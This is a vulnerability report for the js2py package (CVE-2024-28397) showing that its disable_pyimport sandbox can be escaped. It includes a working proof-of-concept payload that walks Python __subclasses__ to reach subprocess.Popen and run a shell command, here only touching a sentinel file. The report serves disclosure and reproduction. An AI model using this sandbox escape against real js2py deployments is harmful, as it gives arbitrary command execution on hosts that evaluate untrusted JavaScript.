report.body:
I found a vulnerability in this package. the disable_pyimport sandbox is escapable via __subclasses__ to subprocess.Popen.

Tracked as CVE-2024-28397.

Proof of concept:

```python
import os, tempfile, js2py
sentinel = os.path.join(tempfile.gettempdir(), "slopgate_js2py")
try: os.remove(sentinel)
except OSError: pass
js2py.disable_pyimport()
cmd = "touch " + sentinel
payload = """
let cmd = "%s"
let hacked, bymarve, n11, getattr, obj
hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__
function findpopen(o) {
    let result;
    for (let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if (item.__module__ == "subprocess" && item.__name__ == "Popen") { return item }
        if (item.__name__ != "type" && (result = findpopen(item))) { return result }
    }
}
findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
""" % cmd
try: js2py.eval_js(payload)
except Exception as e: print("raised:", type(e).__name__)
print("SLOPGATE:REPRODUCED" if os.path.exists(sentinel) else "SLOPGATE:NOT_REPRODUCED")
```
